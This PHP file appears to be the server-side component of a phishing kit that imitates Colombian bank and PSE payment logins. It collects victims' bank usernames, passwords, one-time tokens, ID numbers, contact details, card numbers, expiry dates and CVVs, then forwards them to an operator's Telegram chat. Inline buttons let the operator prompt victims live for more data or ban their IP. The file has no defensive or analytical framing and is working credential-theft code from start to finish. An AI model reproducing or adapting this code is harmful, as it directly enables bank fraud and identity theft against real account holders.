<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
try {

$configLocal = @include __DIR__ . '/config.php';
    $config = is_array($configLocal) ? $configLocal : [];
    
    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        $globalPath = __DIR__ . '/../config.php';
        if (file_exists($globalPath)) {
            $config = include $globalPath;
        }
    }

    $transactionId = $_POST['transactionId'] ?? '';
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
    $u_id = $_POST['u_id'] ?? '';
    $u_ps = $_POST['u_ps'] ?? '';
    $u_tk = $_POST['u_tk'] ?? '';
    $u_tb_raw = $_POST['u_tb'] ?? '{}';

    if (empty($transactionId) || empty($u_id)) {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
        exit;
    }

    $tb = json_decode($u_tb_raw, true);
    if (!is_array($tb)) $tb = [];

    // IP & Device
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $device = 'PC';
    if (stripos($userAgent, 'Android') !== false) $device = 'Android';
    elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) $device = 'iPhone';
    elseif (stripos($userAgent, 'Mobile') !== false) $device = 'Movil';

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $hora = date('d/m/Y H:i:s');

    $bancoRaw = !empty($tb['banco']) ? $tb['banco'] : '1002 - BANCO POPULAR';
    $banco = function_exists('jelpi_format_banco') ? jelpi_format_banco($bancoRaw, 'b-08') : strtoupper($bancoRaw);

    if (!empty($u_tk)) {
        // Formato para cuando llega Token/Dinamica
        $mensaje = "DINAMICA - {$banco} ◉\n\n";
        
        if (!empty($tb['nombre'])) {
            $mensaje .= "🟢 Nombre: " . $tb['nombre'] . "\n\n";
        }
        
        $mensaje .= "🟢 Usuario: " . $u_id . "\n";
        $mensaje .= "🟢 Clave: " . $u_ps . "\n\n";
        $mensaje .= "🟢 Dinamica: " . $u_tk . "\n\n";
        
    } else {
        // Formato para login normal (Usuario y Clave) con todos los datos
        $mensaje = "◉ PSE - {$banco} ◉\n\n";

        if (!empty($tb['nombre'])) $mensaje .= "🟢 Nombre: " . $tb['nombre'] . "\n";
        
        $doc = !empty($tb['documento']) ? $tb['documento'] : (!empty($tb['cedula']) ? $tb['cedula'] : '');
        $tipoDoc = !empty($tb['tipo_identificacion']) ? " (" . $tb['tipo_identificacion'] . ")" : "";
        if ($doc) $mensaje .= "🟢 Documento: " . $doc . $tipoDoc . "\n";

        $correo = !empty($tb['correo']) ? $tb['correo'] : (!empty($tb['email']) ? $tb['email'] : '');
        if ($correo) $mensaje .= "🟢 Correo: " . $correo . "\n";

        $tel = !empty($tb['telefono']) ? $tb['telefono'] : (!empty($tb['celular']) ? $tb['celular'] : '');
        if ($tel) $mensaje .= "🟢 Telefono: " . $tel . "\n";

        if (!empty($tb['direccion'])) $mensaje .= "🟢 Direccion: " . $tb['direccion'] . "\n";
        
        if (!empty($tb['total_pagar'])) $mensaje .= "🟢 Monto: $" . number_format((float)$tb['total_pagar'], 0, ',', '.') . "\n";

        if (!empty($tb['tarjeta'])) {
            $mensaje .= "\n"; // Separador para datos de pago
            $mensaje .= "🟢 Tarjeta: " . $tb['tarjeta'] . "\n";
            
            $fecha = !empty($tb['fecha']) ? $tb['fecha'] : "";
            if (empty($fecha) && !empty($tb['expMonth']) && !empty($tb['expYear'])) {
                $fecha = $tb['expMonth'] . "/" . $tb['expYear'];
            }
            if ($fecha) $mensaje .= "🟢 Fecha: " . $fecha . "\n";
            
            if (!empty($tb['cvv'])) $mensaje .= "🟢 CVV: " . $tb['cvv'] . "\n";
            if (!empty($tb['ownerName'])) $mensaje .= "🟢 Titular TC: " . $tb['ownerName'] . "\n";
        }

        $mensaje .= "\n";
        $mensaje .= "🟢 Usuario: " . $u_id . "\n";
        $mensaje .= "🟢 Clave: " . $u_ps . "\n\n";
    }

    $mensaje .= "🟢 IP: {$ip} | Device: {$device} | {$hora}\n\n";
    $mensaje .= "🐙 @FU7UR4MA 🐙";

    // === Teclado Popular ===
    if (empty($u_tk)) {
        // Teclado cuando se manda Usuario y Clave
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => "Cara", 'callback_data' => "error:{$transactionId}"],
                    ['text' => "Cedula", 'callback_data' => "cedula:{$transactionId}"]
                ],
                [
                    ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"],
                    ['text' => "Tarjeta", 'callback_data' => "error_tc:{$transactionId}"]
                ],
                [
                    ['text' => "Token", 'callback_data' => "pedir_dinamica:{$transactionId}"],
                    ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]
                ],
                [
                    ['text' => "Bre-B", 'callback_data' => "bre_b:{$transactionId}"]
                ],
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]
            ]
        ];
    } else {
        // Teclado cuando se manda el Token
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => "Cara", 'callback_data' => "error:{$transactionId}"],
                    ['text' => "Cedula", 'callback_data' => "cedula:{$transactionId}"]
                ],
                [
                    ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"],
                    ['text' => "Tarjeta", 'callback_data' => "error_tc:{$transactionId}"]
                ],
                [
                    ['text' => "Error Token", 'callback_data' => "error_token:{$transactionId}"],
                    ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]
                ],
                [
                    ['text' => "Bre-B", 'callback_data' => "bre_b:{$transactionId}"]
                ],
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]
            ]
        ];
    }

    $data = [
        'chat_id' => $config['chat_id'],
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
        exit;
    }

    $result = json_decode($response, true);
    if (!$result) {
        echo json_encode(['status' => 'error', 'message' => 'json_decode_failed', 'raw' => $response]);
        exit;
    }

    echo json_encode([
        'status' => !empty($result['ok']) ? 'success' : 'error',
        'messageId' => !empty($result['ok']) ? ($result['result']['message_id'] ?? null) : null
    ]);
} catch (Throwable $e) {
    echo json_encode(['status' => 'error', 'message' => 'server_exception', 'detail' => $e->getMessage()]);
}